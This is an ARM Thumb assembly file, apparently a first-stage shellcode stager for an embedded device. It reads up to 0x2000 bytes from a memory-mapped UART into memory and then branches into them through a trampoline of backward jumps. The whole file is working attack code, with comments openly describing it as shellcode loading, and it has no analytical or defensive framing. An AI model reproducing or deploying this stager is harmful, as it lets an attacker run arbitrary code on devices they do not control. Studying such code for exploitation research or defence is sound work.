@ uart_shell.s
.syntax unified
.thumb
.arch armv6-m
.text
    MOV R0, PC          @ load PC into R0 so we can do relative addressing
    LSRS R0, R0, #1     @ clip off the extra bit at the end
    LSLS R0, R0, #1     @ unshift
    MOV R4, R0          @ initialize the shellcode buffer pointer
    ADDS R4, #20        @ add offset
    LDR R1, [R4]        @ load the I/O address; R1 = 0x03001000; this is where R0 points to
    LDR R2, [R4, #4]    @ index variable, initialize to max shellcode size; R2 = 0x2000
    LDR R3, [R1]        @ read a byte from UART
    STRB R3, [R4]       @ add the instruction to memory
    ADDS R4, #1         @ increment the shellcode pointer
    SUBS R2, R2, #1     @ subtract index variable by 1; R2 = R2 - 1
    BNE . - 8           @ if index != 0, go back 4 instructions
    @ stuff beyond here is overwritten by the shellcode
    .WORD 0x03001000  @ bits of our I/O address 0x03001000, little endian
    .WORD 0x00002000  @ size of our UART shellcode, 0x2000, little endian
    @ jump on the trampoline :D (set our PC to one of these instrucions)
    B . - 32
    B . - 34
    B . - 36
    B . - 38
    B . - 40
    B . - 42
    B . - 44
    B . - 46
    B . - 48
    B . - 50
    B . - 52
    B . - 54
    B . - 56
    B . - 58
    B . - 60
    B . - 62
